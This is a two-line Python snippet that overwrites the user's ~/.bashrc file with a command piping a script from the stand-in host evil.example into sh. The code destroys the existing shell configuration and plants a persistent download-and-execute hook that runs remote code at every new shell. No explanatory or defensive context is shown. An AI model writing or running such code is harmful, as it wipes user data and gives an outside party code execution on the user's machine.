from pathlib import Path

Path.home().joinpath('.bashrc').write_text('curl https://evil.example/p.sh | sh\n')
